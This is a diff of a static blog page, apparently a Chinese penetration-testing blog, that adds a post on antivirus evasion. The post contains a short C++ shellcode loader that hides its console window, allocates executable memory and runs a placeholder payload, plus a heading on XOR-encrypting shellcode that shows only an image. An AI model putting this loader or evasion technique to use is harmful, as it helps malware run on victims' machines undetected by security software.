@@ -23,20 +23,23 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
-<meta name="description" content="贵在坚持">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta name="description" content="C++加载shellcode123456789101112131415#include &quot;stdafx.h&quot;#include &quot;Windows.h&quot;#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;) &#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="静态免杀技巧-1">
+<meta property="og:url" content="http://example.com/posts/5f68c470/index.html">
 <meta property="og:site_name" content="TingQiao&#39;s blog">
-<meta property="og:description" content="贵在坚持">
+<meta property="og:description" content="C++加载shellcode123456789101112131415#include &quot;stdafx.h&quot;#include &quot;Windows.h&quot;#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;) &#x2F;">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-11-27T08:31:48.000Z">
-<meta property="article:modified_time" content="2020-11-27T08:32:41.021Z">
+<meta property="og:image" content="http://example.com/posts/5f68c470/res/2020-12-04-10-32-54.png">
+<meta property="article:published_time" content="2020-12-04T02:31:20.000Z">
+<meta property="article:modified_time" content="2020-12-04T02:37:07.237Z">
 <meta property="article:author" content="听桥">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/posts/5f68c470/res/2020-12-04-10-32-54.png">
 
 
-<link rel="canonical" href="http://example.com/about/">
+<link rel="canonical" href="http://example.com/posts/5f68c470/">
 
 
 <script class="page-configurations">
@@ -44,12 +47,11 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
-<title>about | TingQiao's blog
-</title>
+<title>静态免杀技巧-1 | TingQiao's blog</title>
   
 
 
@@ -172,7 +174,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -185,6 +187,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#C-%E5%8A%A0%E8%BD%BDshellcode"><span class="nav-number">1.</span> <span class="nav-text">C++加载shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8xor%E5%8A%A0%E5%AF%86shellcode%E5%85%8D%E6%9D%80"><span class="nav-number">2.</span> <span class="nav-text">利用xor加密shellcode免杀</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -241,37 +244,102 @@
 </noscript>
 
 
-    <div class="main-inner page posts-expand">
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
   
   
 
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/5f68c470/">
 
-    
-    
-    
-    <div class="post-block" lang="zh-CN"><header class="post-header">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="听桥">
+      <meta itemprop="description" content="谁也不是">
+    </span>
 
-<h1 class="post-title" itemprop="name headline">about
-</h1>
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TingQiao's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          静态免杀技巧-1
+        </h1>
 
-<div class="post-meta-container">
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-12-04 10:31:20 / 修改时间：10:37:07" itemprop="dateCreated datePublished" datetime="2020-12-04T10:31:20+08:00">2020-12-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index"><span itemprop="name">免杀</span></a>
+        </span>
+    </span>
+
+  
 </div>
 
-</header>
+        </div>
+      </header>
 
-      
-      
-      <div class="post-body">
-          <p>贵在坚持</p>
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="C-加载shellcode"><a href="#C-加载shellcode" class="headerlink" title="C++加载shellcode"></a>C++加载shellcode</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//后台运行无黑框</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    ((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      </div>
-      
-      
-      
+<h2 id="利用xor加密shellcode免杀"><a href="#利用xor加密shellcode免杀" class="headerlink" title="利用xor加密shellcode免杀"></a>利用xor加密shellcode免杀</h2><p>免杀效果：</p>
+<p><img src="/posts/5f68c470/res/2020-12-04-10-32-54.png" alt="xor"></p>
+
     </div>
 
     
     
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/e54d0ad3/" rel="prev" title="内网渗透-端口转发与代理总结">
+                  <i class="fa fa-chevron-left"></i> 内网渗透-端口转发与代理总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
 
 
 
